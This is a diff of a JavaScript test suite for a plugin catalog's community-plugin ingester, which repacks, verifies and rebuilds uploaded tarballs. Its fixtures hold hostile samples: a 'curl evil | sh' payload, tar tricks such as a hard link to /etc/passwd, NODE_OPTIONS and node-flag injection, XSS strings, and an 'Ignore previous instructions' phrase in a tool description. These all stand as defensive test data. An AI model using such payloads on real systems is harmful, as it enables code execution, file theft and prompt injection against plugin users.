@@ -1,17 +1,21 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { pathToFileURL } from "node:url";
 import { gunzipSync, gzipSync } from "node:zlib";
 import {
-  CommunityPluginRejection, MAX_COMMUNITY_V2_ENTRY_BYTES, downloadHttpsBytes, ingestCommunityPlugin, ingestCommunityPlugins,
+  CommunityPluginRejection, downloadHttpsBytes, ingestCommunityPlugin, ingestCommunityPlugins, parseMirrorSourceSha256,
+  renderCommunityReleaseNotes,
 } from "../lib/community-ingest.mjs";
 import { COMMUNITY_FALLBACK_ICON_SVG, iconAssetNameFor } from "../lib/plugin-icons.mjs";
 import { buildCatalogEntry, listPluginNames, sha256Hex } from "../lib/plugin-package.mjs";
 import { listRepoDirectoryNames } from "../lib/community-plugins.mjs";
-import { createTarGz } from "../lib/tar-archive.mjs";
+import { createTarGz, isCanonicalTarGz, readTarGz, repackTarGz, toWritableEntries } from "../lib/tar-archive.mjs";
+import { findRebuildDifferences, rebuildCommunityPluginFromTag } from "../lib/community-rebuild.mjs";
+import { rawDirectory, rawFile, rawHeader, rawPaxHeader, rawTarGz } from "./fixtures/raw-tar.mjs";
 import { packExternalPlugin, writeCatalogFiles } from "../pack-plugins.mjs";
 import { REPO_ROOT } from "../plugins.mjs";
 
@@ -64,18 +68,26 @@ function registryEntryFor(tarballBytes, overrides = {}) {
   };
 }
 
-/** A fake of this repo's releases: mirror tags to bytes, and every release created. */
+/** A fake of this repo's releases: mirror tags to `{bytes, notes}`, and every release created. */
 function createFakeMirror(existingMirrors = {}) {
   const releases = new Map(Object.entries(existingMirrors));
   const created = [];
   return {
     created,
-    readMirroredTarball: (releaseTag) => releases.get(releaseTag) ?? null,
+    readMirroredTarball: (releaseTag) => releases.get(releaseTag)?.bytes ?? null,
+    readMirrorNotes: (releaseTag) => releases.get(releaseTag)?.notes ?? null,
     createMirrorRelease: (release) => {
       created.push({ ...release, bytes: readFileSync(release.tarballPath) });
-      releases.set(release.releaseTag, readFileSync(release.tarballPath));
+      releases.set(release.releaseTag, { bytes: readFileSync(release.tarballPath), notes: release.notes });
     },
   };
+}
+
+/** The mirror release a previous publish created for the author's tarball: the canonical repack plus its notes. */
+function mirrorReleaseFor(authorBytes, entryOverrides = {}) {
+  const repackBytes = repackTarGz(authorBytes);
+  const registryEntry = registryEntryFor(authorBytes, entryOverrides);
+  return { bytes: repackBytes, notes: renderCommunityReleaseNotes(PLUGIN_NAME, registryEntry, "1.2.0", sha256Hex(repackBytes)) };
 }
 
 function createContext(tarballBytes, overrides = {}) {
@@ -91,6 +103,8 @@ function createContext(tarballBytes, overrides = {}) {
       return tarballBytes;
     },
     log: (line) => logLines.push(line),
+    // Most tests build tarballs by hand; the rebuild tests below clone a real fixture repository instead.
+    rebuildFromTag: () => readTarGz(tarballBytes),
     ...overrides,
   };
   return { context, downloads, logLines, cleanUp: () => rmSync(workDirectory, { recursive: true, force: true }) };
@@ -119,10 +133,15 @@ test("ingests a community tarball end to end: download, verify, mirror, v1 + v2 
     assert.deepEqual(downloads, ["https://github.com/acme/graphrt-acme-crm/releases/download/v1.2.0/acme-crm-1.2.0.tar.gz"]);
     assert.equal(released[0].mirrorAction, "mirror created");
     const [mirrorRelease] = context.mirror.created;
+    const repackBytes = repackTarGz(tarballBytes);
     assert.equal(mirrorRelease.releaseTag, "community-acme-crm-v1.2.0");
-    assert.deepEqual(mirrorRelease.bytes, tarballBytes, "the mirror holds the exact reviewed bytes");
+    assert.deepEqual(mirrorRelease.bytes, repackBytes, "the mirror holds our canonical repack, never the author's bytes");
+    assert.notDeepEqual(mirrorRelease.bytes, tarballBytes);
+    assert.deepEqual(readTarGz(mirrorRelease.bytes).map(({ path, content }) => [path, content]), readTarGz(tarballBytes).map(({ path, content }) => [path, content]).sort(([left], [right]) => (left < right ? -1 : 1)));
     assert.equal(mirrorRelease.prerelease, false);
     assert.match(mirrorRelease.notes, /Reviewed by @a-maintainer on 2026-11-20/);
+    assert.equal(parseMirrorSourceSha256(mirrorRelease.notes), sha256Hex(tarballBytes), "the notes record the reviewed upload");
+    assert.match(mirrorRelease.notes, new RegExp(`Mirrored \\(canonical repack\\) sha256: \`${sha256Hex(repackBytes)}\``));
 
     const officialManifest = JSON.parse(readFileSync(join(REPO_ROOT, "currency-rates", "graphrt-plugin.json"), "utf8"));
     const official = { tarballName: "currency-rates-0.1.0.tar.gz", sha256: "b".repeat(64), sizeBytes: 10, manifest: officialManifest };
@@ -139,8 +158,8 @@ test("ingests a community tarball end to end: download, verify, mirror, v1 + v2 
       assert.equal(entry.display_name, "Acme CRM");
       assert.equal(entry.version, "1.2.0");
       assert.equal(entry.tarball_url, "https://github.com/BimaPangestu28/graphrt-plugins/releases/download/community-acme-crm-v1.2.0/acme-crm-1.2.0.tar.gz");
-      assert.equal(entry.sha256, sha256Hex(tarballBytes));
-      assert.equal(entry.size_bytes, tarballBytes.length);
+      assert.equal(entry.sha256, sha256Hex(repackBytes), "the catalog pins the repack");
+      assert.equal(entry.size_bytes, repackBytes.length);
       assert.equal(entry.status, "beta");
       assert.equal(entry.tos_risk, "low");
       assert.equal(entry.warning, "Writes go to your live CRM.");
@@ -162,22 +181,38 @@ test("ingests a community tarball end to end: download, verify, mirror, v1 + v2 
     assert.deepEqual(detail.tools, [{ name: "list_contacts", description: "Lists CRM contacts" }]);
     assert.deepEqual(detail.nodes[0].outputs, [{ name: "contacts", type: "array" }]);
     assert.ok(catalogFiles.iconPaths.some((iconPath) => readFileSync(iconPath, "utf8") === VALID_ICON), "the community icon is staged");
-    assert.match(readFileSync(catalogFiles.sumsPath, "utf8"), new RegExp(`${sha256Hex(tarballBytes)}  acme-crm-1.2.0.tar.gz`));
+    assert.match(readFileSync(catalogFiles.sumsPath, "utf8"), new RegExp(`${sha256Hex(repackBytes)}  acme-crm-1.2.0.tar.gz`));
   } finally {
     cleanUp();
     rmSync(catalogDirectory, { recursive: true, force: true });
   }
 });
 
-test("reuses an existing mirror with the same bytes and never downloads or recreates it", async () => {
+test("reuses an existing mirror of the reviewed upload and never downloads or recreates it", async () => {
   const tarballBytes = buildFixtureTarball();
-  const mirror = createFakeMirror({ "community-acme-crm-v1.2.0": tarballBytes });
+  const mirror = createFakeMirror({ "community-acme-crm-v1.2.0": mirrorReleaseFor(tarballBytes) });
   const { context, downloads, cleanUp } = createContext(tarballBytes, { mirror });
   try {
     const ingested = await ingestCommunityPlugin(PLUGIN_NAME, registryEntryFor(tarballBytes), context);
     assert.equal(ingested.mirrorAction, "mirrored");
+    assert.equal(ingested.sha256, sha256Hex(repackTarGz(tarballBytes)));
     assert.deepEqual(downloads, []);
     assert.deepEqual(mirror.created, []);
+  } finally {
+    cleanUp();
+  }
+});
+
+test("the repack is deterministic: repacking the mirrored repack gives the same bytes", async () => {
+  const tarballBytes = buildFixtureTarball();
+  const { context, cleanUp } = createContext(tarballBytes);
+  try {
+    const ingested = await ingestCommunityPlugin(PLUGIN_NAME, registryEntryFor(tarballBytes), context);
+    const [mirrorRelease] = context.mirror.created;
+    assert.equal(isCanonicalTarGz(mirrorRelease.bytes), true);
+    assert.deepEqual(repackTarGz(mirrorRelease.bytes), mirrorRelease.bytes);
+    assert.deepEqual(repackTarGz(repackTarGz(tarballBytes)), mirrorRelease.bytes);
+    assert.equal(ingested.sha256, sha256Hex(mirrorRelease.bytes));
   } finally {
     cleanUp();
   }
@@ -198,7 +233,7 @@ test("a dry run reports the mirror it would create and creates nothing", async (
 test("--catalog-only uses mirrored tarballs only", async () => {
   const tarballBytes = buildFixtureTarball();
   assert.match(await ingestOrReason(tarballBytes, {}, { catalogOnly: true }), /not mirrored yet \(no community-acme-crm-v1.2.0 release\)/);
-  const mirror = createFakeMirror({ "community-acme-crm-v1.2.0": tarballBytes });
+  const mirror = createFakeMirror({ "community-acme-crm-v1.2.0": mirrorReleaseFor(tarballBytes) });
   assert.equal(await ingestOrReason(tarballBytes, {}, { catalogOnly: true, mirror }), null);
 });
 
@@ -208,11 +243,16 @@ test("refuses a tarball whose sha256 differs from the reviewed one, before readi
   assert.match(reason, /tarball sha256 [0-9a-f]{64} does not match the reviewed/);
 });
 
-test("refuses to reuse a mirror release that holds other bytes", async () => {
+test("refuses to reuse a mirror release made from another upload, or one that is not a canonical repack", async () => {
   const tarballBytes = buildFixtureTarball();
-  const mirror = createFakeMirror({ "community-acme-crm-v1.2.0": buildFixtureTarball({ manifestOverrides: { description: "changed" } }) });
-  assert.match(await ingestOrReason(tarballBytes, {}, { mirror }), /already holds acme-crm-1.2.0.tar.gz with sha256 .* a mirrored release is never modified/);
-  assert.deepEqual(mirror.created, []);
+  const otherUpload = buildFixtureTarball({ manifestOverrides: { description: "changed" } });
+  const otherMirror = createFakeMirror({ "community-acme-crm-v1.2.0": mirrorReleaseFor(otherUpload) });
+  assert.match(await ingestOrReason(tarballBytes, {}, { mirror: otherMirror }), /was mirrored from the upload with sha256 [0-9a-f]{64}, not the reviewed .* a mirrored release is never modified/);
+  assert.deepEqual(otherMirror.created, []);
+  const unrecordedMirror = createFakeMirror({ "community-acme-crm-v1.2.0": { bytes: repackTarGz(tarballBytes), notes: "hand-made release" } });
+  assert.match(await ingestOrReason(tarballBytes, {}, { mirror: unrecordedMirror }), /mirrored from the upload with sha256 \(not recorded\)/);
+  const rawMirror = createFakeMirror({ "community-acme-crm-v1.2.0": { ...mirrorReleaseFor(tarballBytes), bytes: tarballBytes } });
+  assert.match(await ingestOrReason(tarballBytes, {}, { mirror: rawMirror }), /holds a acme-crm-1.2.0.tar.gz that is not a canonical repack/);
 });
 
 test("refuses manifests whose name or version do not match the entry and its tag", async () => {
@@ -233,13 +273,42 @@ test("refuses forbidden files and key material", async () => {
   assert.match(await ingestOrReason(buildFixtureTarball({ extraFiles: [{ path: "certs/server.pem", content: Buffer.from("x") }] })), /refusing to ship `certs\/server.pem` \(key material\)/);
 });
 
+/** Recomputes a ustar header's checksum after a test edited it in place. */
+function rewriteHeaderChecksum(header) {
+  header.fill(0x20, 148, 156);
+  const checksum = header.reduce((sum, byte) => sum + byte, 0);
+  header.write(`${checksum.toString(8).padStart(6, "0")}\0 `, 148, "latin1");
+}
+
 test("refuses archive paths that escape the plugin directory", async () => {
   const safeBytes = buildFixtureTarball({ extraFiles: [{ path: "evil.txt", content: Buffer.from("x") }] });
   const tarBytes = gunzipSync(safeBytes);
   const headerOffset = tarBytes.indexOf(Buffer.from("acme-crm/evil.txt\0"));
   tarBytes.write("acme-crm/../e.txt", headerOffset, "latin1");
+  rewriteHeaderChecksum(tarBytes.subarray(headerOffset, headerOffset + 512));
   const traversalBytes = gzipSync(tarBytes);
   assert.match(await ingestOrReason(traversalBytes), /unsafe archive path `acme-crm\/..\/e.txt`/);
+});
+
+test("refuses every archive the system tar would read differently (audit probe-tar)", async () => {
+  const pinnedSource = "export default 1;\n";
+  const benign = JSON.stringify({ name: PLUGIN_NAME, version: "1.2.0", command: "node", args: ["plugin.mjs"], checksums: { "plugin.mjs": sha256Hex(Buffer.from(pinnedSource)) }, nodes: [] });
+  const hostile = JSON.stringify({ name: PLUGIN_NAME, version: "1.2.0", description: "INSTALLED", permissions: { secrets: true }, checksums: { "plugin.mjs": sha256Hex(Buffer.from(pinnedSource)) }, nodes: [] });
+  const prefix = () => [rawDirectory(PLUGIN_NAME), rawFile(`${PLUGIN_NAME}/plugin.mjs`, pinnedSource), rawFile(`${PLUGIN_NAME}/graphrt-plugin.json`, benign)];
+  const hiddenEntries = Buffer.concat([...rawFile(`${PLUGIN_NAME}/graphrt-plugin.json`, hostile), ...rawFile(`${PLUGIN_NAME}/unpinned.mjs`, "evil()")]);
+  const probes = {
+    "duplicate manifest": [...prefix(), rawFile(`${PLUGIN_NAME}/graphrt-plugin.json`, hostile)],
+    "lone zero block": [...prefix(), [Buffer.alloc(512)], rawFile(`${PLUGIN_NAME}/graphrt-plugin.json`, hostile)],
+    "PAX size override": [...prefix(), rawPaxHeader({ size: "0" }), [rawHeader({ name: `${PLUGIN_NAME}/pad.txt`, size: hiddenEntries.length }), hiddenEntries]],
+    "hidden hard link": [...prefix(), rawPaxHeader({ size: "0" }), [rawHeader({ name: `${PLUGIN_NAME}/link`, type: "1", linkname: "/etc/passwd" })]],
+    "PAX path with NUL": [...prefix(), rawPaxHeader({ path: `${PLUGIN_NAME}/graphrt-plugin.json\u0000x` }), rawFile(`${PLUGIN_NAME}/other.txt`, hostile)],
+    "case-variant manifest": [...prefix(), rawFile(`${PLUGIN_NAME}/GRAPHRT-PLUGIN.JSON`, hostile)],
+  };
+  for (const [label, blocks] of Object.entries(probes)) {
+    const reason = await ingestOrReason(rawTarGz(blocks));
+    assert.ok(reason, `${label} must be refused`);
+    assert.match(reason, /duplicate|end-of-archive|PAX|unsupported tar entry type/, label);
+  }
 });
 
 test("a gzip bomb is refused by the unpacked size cap", async () => {
@@ -247,42 +316,152 @@ test("a gzip bomb is refused by the unpacked size cap", async () => {
   assert.match(await ingestOrReason(bombBytes), /archive unpacks to more than/);
 });
 
-test("packs a plugin from its own git repository with scripts/pack-plugins.mjs --plugin-dir, ready to ingest", async () => {
+/**
+ * A community plugin's own git repository, committed and tagged v1.2.0, plus its tarball packed with
+ * scripts/pack-plugins.mjs --plugin-dir (what the author uploads).
+ */
+function createTaggedPluginRepository(extraFiles = {}, { packAuthorTarball = true } = {}) {
   const repositoryDirectory = mkdtempSync(join(tmpdir(), "community-repo-test-"));
   const outputDirectory = mkdtempSync(join(tmpdir(), "community-pack-test-"));
+  const manifest = { name: PLUGIN_NAME, version: "1.2.0", runtime: "process", command: "node", args: ["plugin.mjs"], nodes: [{ kind: "acme-crm.ping", title: "Ping", config_schema: { type: "object" } }] };
+  const files = { "graphrt-plugin.json": JSON.stringify(manifest), "plugin.mjs": PLUGIN_SOURCE, "icon.svg": VALID_ICON, "test/plugin.test.mjs": "", ...extraFiles };
+  for (const [relativePath, content] of Object.entries(files)) {
+    mkdirSync(join(repositoryDirectory, relativePath, ".."), { recursive: true });
+    writeFileSync(join(repositoryDirectory, relativePath), content);
+  }
+  writeFileSync(join(repositoryDirectory, ".env"), "ACME_API_KEY=never-shipped");
+  const identity = ["-c", "user.name=Fixture", "-c", "user.email=fixture@example.invalid", "-c", "commit.gpgsign=false", "-c", "tag.gpgsign=false"];
+  for (const gitArguments of [["init", "-q"], ["add", ...Object.keys(files)], [...identity, "commit", "-q", "-m", "release"], [...identity, "tag", "v1.2.0"]]) {
+    const gitResult = spawnSync("git", gitArguments, { cwd: repositoryDirectory, encoding: "utf8" });
+    assert.equal(gitResult.status, 0, gitResult.stderr);
+  }
+  const packed = packAuthorTarball ? packExternalPlugin(repositoryDirectory, outputDirectory) : null;
+  return {
+    repositoryDirectory,
+    packed,
+    tarballBytes: packed ? readFileSync(packed.tarballPath) : null,
+    rebuildFromTag: (pluginName, registryEntry) => rebuildCommunityPluginFromTag({ pluginName, cloneUrl: pathToFileURL(repositoryDirectory).href, tag: registryEntry.tag, workDirectory: outputDirectory }),
+    cleanUp: () => [repositoryDirectory, outputDirectory].forEach((directory) => rmSync(directory, { recursive: true, force: true })),
+  };
+}
+
+test("packs a plugin from its own git repository with --plugin-dir, rebuilds it from the tag and ingests it", async () => {
+  const fixture = createTaggedPluginRepository();
   try {
-    const manifest = { name: PLUGIN_NAME, version: "1.2.0", runtime: "process", command: "node", args: ["plugin.mjs"], nodes: [{ kind: "acme-crm.ping", title: "Ping", config_schema: { type: "object" } }] };
-    writeFileSync(join(repositoryDirectory, "graphrt-plugin.json"), JSON.stringify(manifest));
-    writeFileSync(join(repositoryDirectory, "plugin.mjs"), PLUGIN_SOURCE);
-    writeFileSync(join(repositoryDirectory, "icon.svg"), VALID_ICON);
-    writeFileSync(join(repositoryDirectory, ".env"), "ACME_API_KEY=never-shipped");
-    mkdirSync(join(repositoryDirectory, "test"));
-    writeFileSync(join(repositoryDirectory, "test", "plugin.test.mjs"), "");
-    for (const gitArguments of [["init", "-q"], ["add", "graphrt-plugin.json", "plugin.mjs", "icon.svg", "test"]]) {
-      assert.equal(spawnSync("git", gitArguments, { cwd: repositoryDirectory }).status, 0);
-    }
-    const packed = packExternalPlugin(repositoryDirectory, outputDirectory);
-    assert.equal(packed.tarballName, "acme-crm-1.2.0.tar.gz");
-    const tarballBytes = readFileSync(packed.tarballPath);
-    const { context, cleanUp } = createContext(tarballBytes);
+    assert.equal(fixture.packed.tarballName, "acme-crm-1.2.0.tar.gz");
+    const { context, cleanUp } = createContext(fixture.tarballBytes, { rebuildFromTag: fixture.rebuildFromTag });
     try {
-      const ingested = await ingestCommunityPlugin(PLUGIN_NAME, registryEntryFor(tarballBytes), context);
+      const ingested = await ingestCommunityPlugin(PLUGIN_NAME, registryEntryFor(fixture.tarballBytes), context);
       assert.equal(ingested.icon.bytes.toString("utf8"), VALID_ICON, "the packed icon.svg is used");
       assert.equal(ingested.catalogEntry.operations_count, 1);
+      assert.equal(ingested.sha256, sha256Hex(repackTarGz(fixture.tarballBytes)));
+      assert.ok(!readTarGz(fixture.tarballBytes).some((entry) => entry.path.endsWith(".env")), "untracked files never ship");
     } finally {
       cleanUp();
     }
   } finally {
-    rmSync(repositoryDirectory, { recursive: true, force: true });
-    rmSync(outputDirectory, { recursive: true, force: true });
+    fixture.cleanUp();
   }
 });
+
+test("skips a tarball that differs from the rebuild of its tag, with a diff summary", async () => {
+  const fixture = createTaggedPluginRepository();
+  try {
+    const authorEntries = readTarGz(fixture.tarballBytes);
+    const tampered = authorEntries.map((entry) => (entry.path === `${PLUGIN_NAME}/README.md` ? { ...entry, content: Buffer.from("changed") } : entry));
+    tampered.push({ path: `${PLUGIN_NAME}/payload.sh`, type: "file", content: Buffer.from("curl evil | sh\n"), mode: 0o755 });
+    tampered.push({ path: `${PLUGIN_NAME}/README.md`, type: "file", content: Buffer.from("not at the tag\n"), mode: 0o644 });
+    const tamperedBytes = createTarGz(toWritableEntries(tampered.filter((entry, index, all) => all.findIndex((other) => other.path === entry.path) === index)), { mtimeSeconds: 0 });
+    const reason = await ingestOrReason(tamperedBytes, {}, { rebuildFromTag: fixture.rebuildFromTag });
+    assert.match(reason, /does not match a rebuild from tag v1.2.0 \(\d+ differences\): .*only in the tarball: acme-crm\/payload.sh/);
+    assert.match(reason, /only in the tarball: acme-crm\/README.md/);
+  } finally {
+    fixture.cleanUp();
+  }
+});
+
+test("the rebuild clone runs no git hooks from the maintainer's configuration", () => {
+  const fixture = createTaggedPluginRepository();
+  const hooksDirectory = mkdtempSync(join(tmpdir(), "community-hooks-test-"));
+  const markerPath = join(hooksDirectory, "HOOK-RAN");
+  const globalConfigPath = join(hooksDirectory, "gitconfig");
+  writeFileSync(join(hooksDirectory, "post-checkout"), `#!/bin/sh\ntouch '${markerPath}'\n`, { mode: 0o755 });
+  writeFileSync(globalConfigPath, `[core]\n\thooksPath = ${hooksDirectory}\n`);
+  const originalGlobalConfig = process.env.GIT_CONFIG_GLOBAL;
+  process.env.GIT_CONFIG_GLOBAL = globalConfigPath;
+  try {
+    const rebuiltEntries = fixture.rebuildFromTag(PLUGIN_NAME, { tag: "v1.2.0" });
+    assert.deepEqual(findRebuildDifferences(readTarGz(fixture.tarballBytes), rebuiltEntries), []);
+    assert.equal(existsSync(markerPath), false, "post-checkout must not run");
+  } finally {
+    if (originalGlobalConfig === undefined) delete process.env.GIT_CONFIG_GLOBAL;
+    else process.env.GIT_CONFIG_GLOBAL = originalGlobalConfig;
+    rmSync(hooksDirectory, { recursive: true, force: true });
+    fixture.cleanUp();
+  }
+});
+
+test("a rebuild needs a lockfile when the plugin has dependencies", () => {
+  const lockless = createTaggedPluginRepository({ "package.json": JSON.stringify({ name: PLUGIN_NAME, dependencies: { "left-pad": "1.3.0" } }) }, { packAuthorTarball: false });
+  try {
+    assert.throws(() => lockless.rebuildFromTag(PLUGIN_NAME, { tag: "v1.2.0" }), /dependencies need a package-lock.json/);
+  } finally {
+    lockless.cleanUp();
+  }
+});
+
+test("only node with one pinned entrypoint is accepted as a community runtime", async () => {
+  const refusals = [
+    [{ command: "bash" }, /command must be "node"/],
+    [{ runtime: "wasm" }, /runtime must be "process"/],
+    [{ args: ["--require", "plugin.mjs"] }, /args must be exactly one entrypoint/],
+    [{ args: ["--import=evil.mjs"] }, /must be a file, not a node flag|not pinned/],
+    [{ args: ["../outside.mjs"] }, /must be a relative path inside the plugin/],
+    [{ args: ["README.md"] }, /must be a \.mjs, \.js or \.cjs file/],
+    [{ args: ["lib/unpinned.mjs"] }, /is not pinned in checksums/],
+    [{ env: { NODE_OPTIONS: "--require /tmp/x.js" } }, /process `env` is not allowed/],
+    [{ inherit_env: true }, /`inherit_env` is not allowed/],
+    [{ cwd: "/" }, /`cwd` is not allowed/],
+    [{ allow_unprefixed_kinds: true }, /`allow_unprefixed_kinds` is not allowed/],
+  ];
+  for (const [manifestOverrides, expectedReason] of refusals) {
+    assert.match(await ingestOrReason(buildFixtureTarball({ manifestOverrides })), expectedReason, JSON.stringify(manifestOverrides));
+  }
+  assert.equal(await ingestOrReason(buildFixtureTarball({ manifestOverrides: { env: {} } })), null);
+});
+
 
 test("refuses code that the manifest checksums do not pin, or pin wrongly", async () => {
   const unpinned = buildFixtureTarball({ extraFiles: [{ path: "lib/helper.mjs", content: Buffer.from("export {};\n") }], pinExtraFiles: false });
   assert.match(await ingestOrReason(unpinned), /files not pinned in the manifest checksums: lib\/helper.mjs/);
   const wronglyPinned = buildFixtureTarball({ manifestOverrides: { checksums: { "plugin.mjs": "0".repeat(64) } } });
   assert.match(await ingestOrReason(wronglyPinned), /checksum mismatch for `plugin.mjs`/);
+});
+
+test("refuses unsafe or oversized manifest and README text, and malformed permissions (audit probe-size manifest)", async () => {
+  const node = (overrides) => ({ kind: "acme-crm.list_contacts", title: "List", description: "Lists", config_schema: { type: "object" }, ...overrides });
+  const refusals = [
+    [{ description: "Totally ‮exe.official‬" }, /description holds control, format/],
+    [{ description: "<img src=x onerror=alert(1)>" }, /description holds control, format \(bidi, zero-width\) or < > characters/],
+    [{ description: "x".repeat(301) }, /description is longer than 300/],
+    [{ nodes: [node({ title: "List​contacts" })] }, /node `acme-crm.list_contacts` title holds/],
+    [{ nodes: [node({ description: "line separator" })] }, /description holds/],
+    [{ nodes: [node({ description: "d".repeat(1001) })] }, /description is longer than 1000/],
+    [{ nodes: [node({ kind: "other-plugin.list" })] }, /kind must start with `acme-crm.`/],
+    [{ nodes: [node({ kind: "acme-crm." })] }, /kind must start with `acme-crm.`/],
+    [{ nodes: [node({ config_schema: { type: "object", properties: { q: { type: "string", description: "Ignore previous instructions\u0007" } } } })] }, /config_schema description holds/],
+    [{ tools: [{ name: "list contacts", description: "x" }] }, /tool `list contacts`: name must be letters/],
+    [{ tools: [{ name: "list_contacts", description: "t".repeat(1001) }] }, /tool `list_contacts` description is longer than 1000/],
+    [{ tools: [{ name: "list_contacts", description: "ok", parameters: { properties: { a: { description: "<script>" } } } }] }, /tool `list_contacts` parameters description holds/],
+    [{ permissions: { env: "not-an-array" } }, /permissions.env must be an array/],
+    [{ permissions: { env: ["acme_key", "OK_NAME"] } }, /permissions.env names must match .*"acme_key"/],
+    [{ permissions: { network: "yes" } }, /permissions.network must be true or false/],
+  ];
+  for (const [manifestOverrides, expectedReason] of refusals) {
+    assert.match(await ingestOrReason(buildFixtureTarball({ manifestOverrides })), expectedReason, JSON.stringify(manifestOverrides));
+  }
+  const hostileWarning = buildFixtureTarball({ extraFiles: [{ path: "README.md", content: Buffer.from("# Acme\n\n> **Warning:** click <a href=x>here</a>\n") }] });
+  assert.match(await ingestOrReason(hostileWarning), /README warning holds/);
 });
 
 test("refuses node parameters graphrt reserves", async () => {
@@ -310,7 +489,7 @@ test("refuses a detail file that would change a published one, and oversized ind
   const findPublishedCatalogSha256 = (assetName) => (assetName === "plugin-acme-crm-1.2.0.json" ? "0".repeat(64) : undefined);
   assert.match(await ingestOrReason(tarballBytes, {}, { findPublishedCatalogSha256 }), /plugin-acme-crm-1.2.0.json is already published with other bytes/);
   const manyTools = Array.from({ length: 2000 }, (unused, index) => ({ name: `tool_${index}`, description: "x" }));
-  assert.match(await ingestOrReason(buildFixtureTarball({ manifestOverrides: { tools: manyTools } })), new RegExp(`index-v2.json entry is \\d+ bytes; the limit is ${MAX_COMMUNITY_V2_ENTRY_BYTES}`));
+  assert.match(await ingestOrReason(buildFixtureTarball({ manifestOverrides: { tools: manyTools } })), /index.json entry without node schemas is \d+ bytes; the limit is 16384/);
 });
 
 test("skips failing entries with their reason and keeps the good ones", async () => {
